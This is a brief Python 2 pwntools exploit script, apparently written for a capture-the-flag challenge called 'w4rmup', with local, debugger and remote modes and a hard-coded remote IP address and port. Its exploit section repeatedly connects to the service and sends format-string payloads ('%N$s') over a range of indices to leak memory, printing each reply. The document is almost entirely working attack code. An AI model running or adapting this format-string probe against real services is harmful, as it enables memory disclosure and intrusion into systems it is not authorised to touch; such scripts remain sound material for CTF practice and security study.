#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

#exe = context.binary = ELF('./w4rmup')
context.terminal = ['alacritty', '-e', 'sh', '-c']
context.log_level="debug"
host = args.HOST or '34.91.74.119'
port = int(args.PORT or 49156)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

for i in range(0x1000):
    try:
        io = start()
        payload = "%" + str(i) + "$s"
        io.sendline(payload)
        print(io.recvline())
        io.close()
    except:
        pass
io.interactive()
